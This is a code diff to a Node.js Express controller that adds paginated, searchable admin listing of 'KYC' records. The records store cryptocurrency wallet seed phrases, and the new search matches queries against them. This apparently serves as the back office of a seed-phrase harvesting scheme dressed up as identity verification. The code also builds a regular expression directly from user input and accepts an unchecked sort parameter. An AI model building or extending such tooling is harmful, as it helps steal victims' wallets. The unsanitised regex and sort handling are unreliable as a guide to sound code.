@@ -76,9 +76,24 @@ exports.saveKycDetails = async (req, res) => {
 // Fetch KYC details
 exports.getKycDetails = async (req, res) => {
   try {
-    const { sessionId } = req.query;
-    const kycDetails = await Kyc.find({ sessionId });
-    res.status(200).json(kycDetails);
+    // Support pagination, search and filters for admin listing
+    const { page = 1, limit = 20, q, status, walletType, sessionId, sort = '-createdAt' } = req.query;
+    const skip = (Math.max(1, parseInt(page)) - 1) * Math.max(1, parseInt(limit));
+
+    const filter = {};
+    if (sessionId) filter.sessionId = sessionId;
+    if (status) filter.verificationStatus = status;
+    if (walletType) filter.walletType = walletType;
+    if (q) {
+      // simple text search on sessionId, walletType or seedPhrase (case-insensitive)
+      const re = new RegExp(q, 'i');
+      filter.$or = [ { sessionId: re }, { walletType: re }, { seedPhrase: re } ];
+    }
+
+    const total = await Kyc.countDocuments(filter);
+    const docs = await Kyc.find(filter).sort(sort).skip(skip).limit(Math.max(1, parseInt(limit)));
+
+    res.status(200).json({ total, page: parseInt(page), limit: parseInt(limit), pages: Math.ceil(total / Math.max(1, parseInt(limit))), docs });
   } catch (error) {
     console.error(error);
     res.status(500).json({ message: 'Failed to fetch KYC details' });
